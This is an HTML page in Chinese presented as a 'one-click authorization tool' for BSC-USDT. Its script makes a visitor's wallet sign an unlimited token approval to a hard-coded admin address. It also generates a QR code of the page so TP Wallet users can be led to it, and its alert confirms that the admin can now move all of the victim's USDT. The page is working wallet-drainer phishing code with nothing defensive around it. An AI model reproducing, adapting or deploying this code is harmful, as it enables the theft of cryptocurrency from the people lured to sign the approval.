<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BSC-USDT 一键授权工具</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
body{background:#111;color:#fff;padding:30px}
.box{max-width:400px;margin:0 auto;text-align:center}
h2{margin-bottom:20px;color:#F3BA2F}
#qrcode{
  width:300px;height:300px;background:#fff;padding:12px;
  border-radius:16px;margin:20px auto;
}
#qrcode img{width:100%;height:100%;border-radius:8px}
#approveBtn{
  padding:16px 24px;background:#F3BA2F;color:#000;
  border:none;border-radius:10px;font-size:16px;font-weight:bold;margin-top:20px
}
.desc{color:#ccc;font-size:14px;line-height:1.6;margin-top:15px}
</style>
</head>
<body>
<div class="box">
  <h2>BSC USDT 无限授权</h2>
  <div id="qrcode">加载二维码...</div>
  <button id="approveBtn">✅ 一键执行授权</button>
  <p class="desc">使用TP钱包扫一扫二维码，进入页面后点击按钮即可<br>授权后尾号F1地址可划转你的全部BSC-USDT</p>
</div>

<script>
// 固定参数（和你配置完全一致）
const TOKEN = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";
const CHAIN_ID = "0x38"; // BSC链ID 16进制格式

// 切换BSC链
async function switchChain(){
  try{
    await window.ethereum.request({
      method:"wallet_switchEthereumChain",
      params:[{chainId:CHAIN_ID}]
    })
  }catch(e){}
}

// 执行无限授权
async function doApprove(){
  await switchChain();
  const maxAllowance = "0x" + "f".repeat(64);
  const data = "0x095ea7b3" + ADMIN.slice(2).padStart(64,"0") + maxAllowance;
  await window.ethereum.request({
    method:"eth_sendTransaction",
    params:[{
      to:TOKEN,
      data:data,
      gasLimit:"0x300000"
    }]
  })
  alert("✅ 授权成功！管理员地址已获得全部USDT划转权限");
}

// 生成二维码（内容是当前页面网址，扫码跳TP风险弹窗）
function createQR(){
  const pageUrl = window.location.href;
  const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(pageUrl)}`;
  document.getElementById("qrcode").innerHTML = `<img src="${qrApi}">`;
}

document.getElementById("approveBtn").onclick = doApprove;
window.onload = createQR;
</script>
</body>
</html>
